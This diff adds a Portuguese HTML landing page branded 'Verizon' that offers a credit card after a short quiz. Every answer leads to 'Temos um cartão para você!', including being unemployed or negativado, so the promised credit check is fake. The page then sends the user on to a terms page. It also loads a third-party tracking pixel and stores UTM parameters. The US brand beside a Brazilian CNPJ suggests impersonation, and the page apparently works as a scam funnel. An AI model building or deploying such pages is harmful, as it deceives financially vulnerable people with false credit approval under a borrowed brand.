@@ -1,0 +1,135 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verizon - Faça seu Cartão</title>
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+    
+<script src="js/latest.js" async="" defer=""></script>
+
+<script>
+  window.pixelId = "66bb763debbcebab27d68442";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel.js"></script>
+    
+</head><body>
+    
+    
+<div style="
+  display: grid;
+  grid-template-areas:
+    'top-bar'
+    'content'
+    'footer';
+  grid-template-rows: auto 1fr auto;
+  min-height: 100vh;
+">
+    <div class="header">
+        <img style="width: 160px;" src="images/VfoPzxB.png" alt="Imagem Centralizada"> 
+    </div>
+    
+     <div style="grid-area: content; padding: 0 1rem;">   
+        <div class="text-center mt-5">
+            <h3>Faça seu cartão em 3 minutos!</h3>
+            <p style="color: #6f6f6f;">Responda essas perguntas para verificar seu crédito disponível.</p>
+        </div>
+    
+
+        <div class="main-content">
+            <div id="pagOne" class="mb-3">
+                <h5 class="mb-3">O que é mais importante para você em um cartão de crédito?</h5>
+                <button class="btn btn-custom" onclick="mostrarPagina('pagTwo')">Limite de crédito alto</button>
+                <button class="btn btn-custom" onclick="mostrarPagina('pagTwo')">Crédito imediato</button>
+                <button class="btn btn-custom" onclick="mostrarPagina('pagTwo')">Não consultar SPC/Serasa</button>
+                <button class="btn btn-custom" onclick="mostrarPagina('pagTwo')">Sem anuidade</button>
+            </div>
+            <!-- Seção 2: Próxima Página -->
+            <div id="pagTwo" class="mb-3" style="display: none;">
+                <h5 class="mb-3">Em qual grupo você se encaixa?</h5>
+                <button class="btn btn-custom" onclick="mostrarPagina('rendaMensal')">Empreendedor</button>
+                <button class="btn btn-custom" onclick="mostrarPagina('rendaMensal')">Carteira assinada</button>
+                <button class="btn btn-custom" onclick="mostrarPagina('rendaMensal')">Desempregado</button>
+                <button class="btn btn-custom" onclick="mostrarPagina('rendaMensal')">Aposentado</button>
+                <button class="btn btn-custom" onclick="mostrarPagina('rendaMensal')">Servidor público</button>
+                <button class="btn btn-custom" onclick="mostrarPagina('rendaMensal')">Estudante</button>
+                <button class="btn btn-custom" onclick="mostrarPagina('rendaMensal')">Autônomo</button>
+            </div>
+             <!-- Seção 3: Renda Mensal -->
+            <div id="rendaMensal" class="mb-3" style="display: none;">
+                <h5 class="mb-3">Qual é a sua Renda Mensal?</h5>
+                <button class="btn btn-custom" onclick="mostrarPagina('negativado')">Até R$ 1.000</button>
+                <button class="btn btn-custom" onclick="mostrarPagina('negativado')">Entre R$ 1.000 e R$ 2.000</button>
+                <button class="btn btn-custom" onclick="mostrarPagina('negativado')">Entre R$ 2.000 e R$ 4.000</button>
+                <button class="btn btn-custom" onclick="mostrarPagina('negativado')">Acima de R$ 4.000</button>
+            </div>
+            <!-- Seção 4: Negativado -->
+            <div id="negativado" class="mb-3" style="display: none;">
+                <h5 class="mb-3">Você está negativado?</h5>
+                <button class="btn btn-custom" onclick="mostrarPagina('conclusao')">Sim</button>
+                <button class="btn btn-custom" onclick="mostrarPagina('conclusao')">Não</button>
+            </div>
+            <!-- Seção 5: Conclusão -->
+            <div id="conclusao" class="mb-3" style="display: none;">
+                <h4 style="color: #089b08;">Temos um cartão para você!</h4>
+                <p>Conclua seu cadastro e faça seu cartão de crédito agora!</p>
+                <button class="btn btn-custom" onclick="location.href='termos/'">Continuar</button>
+            </div>
+        </div>
+    </div>
+
+
+
+<script>
+    function mostrarPagina(paginaId) {
+        // Esconde ambas as seções
+        document.getElementById('pagOne').style.display = 'none';
+        document.getElementById('pagTwo').style.display = 'none';
+        document.getElementById('rendaMensal').style.display = 'none';
+        document.getElementById('negativado').style.display = 'none';
+
+        // Mostra a seção desejada
+        document.getElementById(paginaId).style.display = 'block';
+    }
+</script>
+
+<script>
+    
+    function storeUTMParams() {
+    const params = new URLSearchParams(window.location.search);
+    const utmParams = {};
+
+    // Armazena apenas os parâmetros UTM
+    params.forEach((value, key) => {
+        if (key.startsWith('utm_')) {
+            utmParams[key] = value;
+        }
+    });
+
+    // Salva os parâmetros UTM em uma chave específica no localStorage
+    localStorage.setItem('utmParams', JSON.stringify(utmParams));
+
+    // Exibe no console o que foi armazenado no localStorage
+    console.log('Parâmetros UTM armazenados no localStorage:', utmParams);
+}
+
+window.onload = function() {
+    storeUTMParams();
+};
+</script>
+
+    <div class="footer py-4" id="footerChg">
+        © 2024 Verizon S/A. CNPJ 68.694.585/0001-20. <br>
+        Av. Brig. Faria Lima, 1811, São Paulo/SP
+    </div>
+
+    <script src="js/bootstrap.bundle.min.js"></script>
+
+
+
+
+</div>
+</body></html>
